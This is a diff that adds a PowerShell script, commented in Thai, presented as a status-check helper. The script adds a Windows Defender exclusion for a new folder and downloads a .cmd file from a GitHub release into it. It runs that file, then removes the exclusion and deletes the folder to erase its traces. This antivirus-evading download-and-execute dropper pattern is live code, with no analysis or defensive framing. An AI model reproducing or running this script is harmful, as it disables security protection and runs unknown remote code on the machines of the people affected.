@@ -1,1 +1,44 @@
+# 1. ตั้งค่าตัวแปรพื้นฐาน
+$workDir = "C:\phwyverysad"
+$url = "https://github.com/plathx/-/releases/download/%E0%B8%88%E0%B8%B9%E0%B8%99%E0%B8%84%E0%B8%AD%E0%B8%A1/check_status.cmd"
+$fileName = "check_status.cmd"
+$filePath = Join-Path $workDir $fileName
 
+# 2. สร้างโฟลเดอร์สำหรับทำงาน (หากยังไม่มี)
+if (!(Test-Path $workDir)) {
+    New-Item -Path $workDir -ItemType Directory -Force | Out-Null
+}
+
+# 3. เพิ่ม Exclusion เพื่อป้องกันไม่ให้ Windows Defender สแกนโฟลเดอร์นี้
+Write-Host "Configuring exclusion for $workDir..." -ForegroundColor Cyan
+Add-MpPreference -ExclusionPath $workDir
+
+# 4. ดาวน์โหลดไฟล์โดยใช้ .NET (System.Net.WebClient)
+Write-Host "Downloading $fileName..." -ForegroundColor Cyan
+try {
+    $webClient = New-Object System.Net.WebClient
+    $webClient.DownloadFile($url, $filePath)
+}
+catch {
+    Write-Host "Download failed: $_" -ForegroundColor Red
+    exit
+}
+
+# 5. สั่งรันไฟล์ .cmd และรอจนกว่าหน้าต่างโปรแกรมจะปิดตัวลง
+if (Test-Path $filePath) {
+    Write-Host "Running $fileName and waiting for exit..." -ForegroundColor Yellow
+    $process = Start-Process -FilePath $filePath -Wait -PassThru
+    
+    # 6. หลังจากไฟล์ .cmd ปิดลง ให้ทำการลบโฟลเดอร์และข้อยกเว้นทิ้ง
+    Write-Host "Cleaning up system..." -ForegroundColor Green
+    
+    # ลบข้อยกเว้นออกเพื่อความปลอดภัย
+    Remove-MpPreference -ExclusionPath $workDir -ErrorAction SilentlyContinue
+    
+    # ลบโฟลเดอร์และไฟล์ทั้งหมดแบบถาวร
+    Remove-Item -Path $workDir -Recurse -Force
+    Write-Host "Completed successfully." -ForegroundColor White
+}
+else {
+    Write-Host "Error: Could not find the downloaded file." -ForegroundColor Red
+}
